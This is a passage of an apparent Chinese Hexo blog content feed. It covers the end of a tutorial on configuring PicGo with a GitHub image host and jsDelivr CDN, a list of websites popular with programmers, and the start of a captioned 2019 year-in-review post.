class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/06.png"><img alt="06" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/06.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/07.png"><img alt="07" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/07.png" class="lazyload"></a><br></fancybox><h1 id="–-配置PicGo"><a href="#–-配置PicGo" class="headerlink" title="– 配置PicGo"></a><font color="#FF000">– 配置PicGo</font></h1><p>前往<a href="https://github.com/Molunerfinn/picgo/releases" target="_blank" rel="noopener">下载PicGo</a>，安装好后开始配置图床</p><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png"><img alt="08" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png" class="lazyload"></a><br></fancybox><ul><li><p><font color="#FF000">设定仓库名：</font>按照【用户名/图床仓库名】的格式填写</p></li><li><p><font color="#FF000">设定分支名：</font>【master】</p></li><li><p><font color="#FF000">设定Token：</font>粘贴之前生成的【Token】</p></li><li><p><font color="#FF000">指定存储路径：</font>填写想要储存的路径，如【ITRHX-PIC/】，这样就会在仓库下创建一个名为 ITRHX-PIC 的文件夹，图片将会储存在此文件夹中</p></li><li><p><font color="#FF000">设定自定义域名：</font>它的作用是，在图片上传后，PicGo 会按照【自定义域名+储存路径+上传的图片名】的方式生成访问链接，并放到粘贴板上，因为我们要使用 jsDelivr 加速访问，所以可以设置为【<a href="https://cdn.jsdelivr.net/gh/用户名/图床仓库名" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/用户名/图床仓库名</a> 】，上传完毕后，我们就可以通过【<a href="https://cdn.jsdelivr.net/gh/用户名/图床仓库名/图片路径" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/用户名/图床仓库名/图片路径</a> 】加速访问我们的图片了，比如上图的图片链接为：<a href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png</a></p></li></ul><p>关于 jsDelivr 具体是如何引用资源的可以参考我的另一篇博客：<a href="https://www.itrhx.com/2019/02/10/A18-free-cdn/">《免费CDN：jsDelivr+Github》</a></p><hr><h1 id="–-进行高效创作"><a href="#–-进行高效创作" class="headerlink" title="– 进行高效创作"></a><font color="#FF000">– 进行高效创作</font></h1><p>配置好PicGo后，我们就可以进行高效创作了，将图片拖拽到上传区，将会自动上传并复制访问链接，将链接粘贴到博文中就行了，访问速度杠杠的，此外PicGo还有相册功能，可以对已上传的图片进行删除，修改链接等快捷操作，PicGo还可以生成不同格式的链接、支持批量上传、快捷键上传、自定义链接格式、上传前重命名等，更多功能自己去探索吧！</p></div></section>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsDelivr </tag>
            
            <tag> 图床 </tag>
            
            <tag> PicGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员平时喜欢逛的论坛</title>
      <link href="%E7%A8%8B%E5%BA%8F%E5%91%98%E5%B9%B3%E6%97%B6%E5%96%9C%E6%AC%A2%E9%80%9B%E7%9A%84%E8%AE%BA%E5%9D%9B.html"/>
      <url>%E7%A8%8B%E5%BA%8F%E5%91%98%E5%B9%B3%E6%97%B6%E5%96%9C%E6%AC%A2%E9%80%9B%E7%9A%84%E8%AE%BA%E5%9D%9B.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="程序员平时喜欢逛的论坛"><a href="#程序员平时喜欢逛的论坛" class="headerlink" title="程序员平时喜欢逛的论坛"></a>程序员平时喜欢逛的论坛</h1><h2 id="1-Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸"><a href="#1-Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸" class="headerlink" title="1.Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸~"></a>1.Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸~</h2><p><img data-rawwidth="270" data-rawheight="480" data-size="normal" data-caption data-default-watermark-src="https://pic3.zhimg.com/50/v2-0d1dc6bd381218219995d7c76614a85b_hd.jpg" class="content_image lazyload" width="270" data-src="https://pic2.zhimg.com/50/v2-e8d6b59ee3ebe0c9c97f3ea21740d5eb_hd.jpg"><img data-rawwidth="720" data-rawheight="652" data-size="normal" data-caption data-default-watermark-src="https://pic3.zhimg.com/50/v2-9fcfcff0a471f770bba810b8d91c2c20_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="720" data-original="https://pic1.zhimg.com/v2-4b2019eaa1c5d0822d881bfb29f768a7_r.jpg" data-src="https://pic1.zhimg.com/50/v2-4b2019eaa1c5d0822d881bfb29f768a7_hd.jpg"><br>&emsp;&emsp;好了，正经点。Github是程序员托管代码的平台，很多开发者都会在上面找各种各样的开源项目来学习。阿里、腾讯、字节跳动、美团、Google、Micosoft等国内外大厂都有自己的Github开源库。</p><h2 id="2-LintCodeLintCode-收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选-Facebook-Amazon-Google-Linkedin-等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。"><a href="#2-LintCodeLintCode-收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选-Facebook-Amazon-Google-Linkedin-等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。" class="headerlink" title="2. LintCodeLintCode 收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选 Facebook, Amazon, Google, Linkedin 等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。"></a>2. LintCodeLintCode 收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选 Facebook, Amazon, Google, Linkedin 等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。</h2><img data-rawwidth="1883" data-rawheight="815" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1883" data-original="https://pic2.zhimg.com/v2-c081c5f067c0c1c158cf6fec5f80dd45_r.jpg" data-src="https://pic2.zhimg.com/50/v2-c081c5f067c0c1c158cf6fec5f80dd45_hd.jpg"><h2 id="3-Stack-OverflowStack-Overflow是一个IT技术问答网站，能解决你在coding中99-99999-的问题，关键是它不会弹出任何广告！"><a href="#3-Stack-OverflowStack-Overflow是一个IT技术问答网站，能解决你在coding中99-99999-的问题，关键是它不会弹出任何广告！" class="headerlink" title="3.Stack OverflowStack Overflow是一个IT技术问答网站，能解决你在coding中99.99999%的问题，关键是它不会弹出任何广告！"></a>3.Stack OverflowStack Overflow是一个IT技术问答网站，能解决你在coding中99.99999%的问题，关键是它不会弹出任何广告！</h2><img data-rawwidth="1808" data-rawheight="684" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1808" data-original="https://pic2.zhimg.com/v2-6c4d2e65c58b3bec7fb856ec55e9a9d7_r.jpg" data-src="https://pic2.zhimg.com/50/v2-6c4d2e65c58b3bec7fb856ec55e9a9d7_hd.jpg"><h2 id="4-CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。"><a href="#4-CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。" class="headerlink" title="4.CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。"></a>4.CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。</h2><img data-rawwidth="1884" data-rawheight="790" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1884" data-original="https://pic1.zhimg.com/v2-fcbd3eb692df3b6e31f941a8c56664b3_r.jpg" data-src="https://pic1.zhimg.com/50/v2-fcbd3eb692df3b6e31f941a8c56664b3_hd.jpg"><h2 id="5-GeeksforGeeks关于算法和数据结构，GeeksforGeeks-有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。"><a href="#5-GeeksforGeeks关于算法和数据结构，GeeksforGeeks-有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。" class="headerlink" title="5.GeeksforGeeks关于算法和数据结构，GeeksforGeeks 有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。"></a>5.GeeksforGeeks关于算法和数据结构，GeeksforGeeks 有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。</h2><img data-rawwidth="1404" data-rawheight="786" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1404" data-original="https://pic2.zhimg.com/v2-c968fa3733cd53b36f14d59b8a85603f_r.jpg" data-src="https://pic2.zhimg.com/50/v2-c968fa3733cd53b36f14d59b8a85603f_hd.jpg"><h2 id="6-CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦-。"><a href="#6-CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦-。" class="headerlink" title="6.CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦~。"></a>6.CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦~。</h2><img data-rawwidth="604" data-rawheight="440" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="604" data-original="https://pic3.zhimg.com/v2-148165e64288b0a97c3bdae1d288ef5f_r.jpg" data-src="https://pic3.zhimg.com/50/v2-148165e64288b0a97c3bdae1d288ef5f_hd.jpg"><h2 id="7-CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。"><a href="#7-CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。" class="headerlink" title="7.CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。"></a>7.CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。</h2><img data-rawwidth="1863" data-rawheight="894" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1863" data-original="https://pic4.zhimg.com/v2-bdc360b016427aa06f12ee3d6af38125_r.jpg" data-src="https://pic4.zhimg.com/50/v2-bdc360b016427aa06f12ee3d6af38125_hd.jpg"><h2 id="8-Kaggle在线竞赛Kaggle-是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。"><a href="#8-Kaggle在线竞赛Kaggle-是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。" class="headerlink" title="8.Kaggle在线竞赛Kaggle 是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。"></a>8.Kaggle在线竞赛Kaggle 是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。</h2><img data-rawwidth="1648" data-rawheight="821" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1648" data-original="https://pic1.zhimg.com/v2-609412aa8fdc685782ae6ba84a940452_r.jpg" data-src="https://pic1.zhimg.com/50/v2-609412aa8fdc685782ae6ba84a940452_hd.jpg"><h2 id="9-B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！"><a href="#9-B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！" class="headerlink" title="9. B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！"></a>9. B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！</h2><img data-rawwidth="1157" data-rawheight="764" data-size="normal" data-caption data-default-watermark-src="https://pic3.zhimg.com/50/v2-35a5c6d4fa87351093653b58510b6ae2_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1157" data-original="https://pic3.zhimg.com/v2-095e1b5a82ec2240fa57afefb87ab923_r.jpg" data-src="https://pic3.zhimg.com/50/v2-095e1b5a82ec2240fa57afefb87ab923_hd.jpg"><h2 id="10-TopCoderTopCoder-是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。"><a href="#10-TopCoderTopCoder-是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。" class="headerlink" title="10.TopCoderTopCoder 是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。"></a>10.TopCoderTopCoder 是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。</h2><img data-rawwidth="1080" data-rawheight="496" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1080" data-original="https://pic4.zhimg.com/v2-6cb99b281a426409aed0a5c4f9435ad6_r.jpg" data-src="https://pic4.zhimg.com/50/v2-6cb99b281a426409aed0a5c4f9435ad6_hd.jpg">]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 年度回顾视频：感谢一切难题！</title>
      <link href="2019.html"/>
      <url>2019.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="2019-年度回顾视频：感谢一切难题！"><a href="#2019-年度回顾视频：感谢一切难题！" class="headerlink" title="2019 年度回顾视频：感谢一切难题！"></a>2019 年度回顾视频：感谢一切难题！</h1><div class="RichText ztext Post-RichText"><p>2019，该如何回顾这一年？</p><p>或许，一言「难」尽</p><p>我们试图用 3 分钟定格关于它的记忆</p><p>好让这 365 个被万种情绪浸泡的时日，得以隽永</p><div><div class="RichText-video" data-za-detail-view-path-module="VideoItem" data-za-extra-module="{&quot;card&quot;:{&quot;content&quot;:{&quot;type&quot;:&quot;Video&quot;,&quot;sub_type&quot;:&quot;SelfHosted&quot;,&quot;video_id&quot;:&quot;1189954775381282816&quot;,&quot;is_playable&quot;:true}}}"><div class="VideoCard VideoCard--interactive"><div class="VideoCard-layout"><div class="VideoCard-video"><div class="VideoCard-video-content"><div class="VideoCard-player"><iframe hidden frameborder="0" allowfullscreen src="https://www.zhihu.com/video/1189954775381282816?autoplay=false&amp;useMSE="></iframe></div></div></div><div class="VideoCard-content"><div class="VideoCard-title">知乎 2019 年度大事记</div></div></div><div class="VideoCard-mask"></div></div></div></div><p>我们用这一年，被迫接受那些<b>猝不及防的「失去」</b></p><p>天灾悄然而至，人祸打破几家团圆</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_r.jpg" data-src="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-61eeacc358160f3771548e2fccb8cab7_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_r.jpg" data-src="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-be307e7956d36867ffdc079f8cf126a0_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p>我们用这一年，去消化那些<b>事与愿违的「来临」</b></p><p>代价是咬牙吞下眼眶里兜转的泪</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_r.jpg" data-src="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-5f733dfcd58a5fb0db4e63e203251cdc_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_r.jpg" data-src="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-0f378b74b8a9bee659f5a414b71c27bf_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p>我们用这一年，试图和<b>旷日持久的「挣扎」</b>抗衡</p><p>但是成人的世界，哪有那么多关心你「疼不疼」的人</p><p>见缝插针的意外，让生命的消殒变得轻易无比</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_r.jpg" data-src="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-9792cfacf584dc8a0b148a4c7889a3ec_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_r.jpg" data-src="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_b.jpg" data-lazy-status="ok" data-src="https://pic2.zhimg.com/80/v2-fad7d866961456977565833d7f67ca65_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>难？成人的世界哪有容易？</b></p><p>于是纵有千万人阻挡，我们也绝不投降</p><p>如果棋逢对手，那就拼上一场</p><p>因为相信，「胜利一定是我们的」</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_r.jpg" data-src="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-93302dbfd7420beae58113916ea76af6_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>有些抵达难免迂回</b>，但曲折离奇终能靠岸</p><p>因为相信，即使一人也不是在孤军奋战</p><p>身处黑暗，「你往前走，我在后面，别害怕」</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_r.jpg" data-src="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_b.jpg" data-lazy-status="ok" data-src="https://pic2.zhimg.com/80/v2-6dd80621efc129cc08d8c72ef2e87935_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_r.jpg" data-src="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-808fe9575a37af9f05b327b2bbc9fac6_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_r.jpg" data-src="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_b.jpg" data-lazy-status="ok" data-src="https://pic2.zhimg.com/80/v2-ee28a98f514bb488753d4609a3590d51_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>有些风暴需要冲破</b>，我们闯荡星河一起涨落</p><p>用冷静和责任战胜搏击长空的险</p><p>用极限去挑战下一个未知的极限</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_r.jpg" data-src="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-1b90b1886d2696f978f0f37042e6c727_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_r.jpg" data-src="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-24cd608b706b52318fa742e33e55b08f_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>直面遗憾，用它练就强悍</b></p><p>因为正义不是如履薄冰，是如影随形</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_r.jpg" data-src="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-da9a533ec679889bbb6b4bac586ee3c4_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>拥抱伤痛，用它兑换荣耀</b></p><p>因为苦尽之后，「我们是冠军」</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_r.jpg" data-src="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-6b411d62a77a4e972347d1d5c0afab98_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_r.jpg" data-src="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-e4a71b597440d6f6c7d9746a74a9b046_hd.jpg"></figure><figure 